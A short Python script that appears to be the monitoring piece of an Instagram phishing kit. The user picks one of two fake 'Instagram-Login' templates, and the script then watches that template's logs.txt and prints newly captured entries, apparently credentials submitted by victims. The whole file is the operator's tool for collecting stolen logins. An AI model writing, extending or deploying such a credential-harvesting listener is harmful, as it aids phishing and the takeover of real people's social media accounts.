from time import sleep
import os


path = input("Instagram-Login Template 1 or Instagram-Loing Template 2 => ")
if (path != "1" and path != "2"):
    print("[!] Error: Please Enter 1 or 2 !!!!")
    exit()

print(f"[*] Listen On Instagram-Login Template {path}")
print("[*] Listen Port...")

while True:
    f = open(f"Instagram-Login-{path}/logs.txt","r")
    file1_size = os.path.getsize(f"Instagram-Login-{path}/logs.txt")
    sleep(0.5)
    file2_size = os.path.getsize(f"Instagram-Login-{path}/logs.txt")
    if file1_size != file2_size:
        print(f.read().strip())
        f.close()

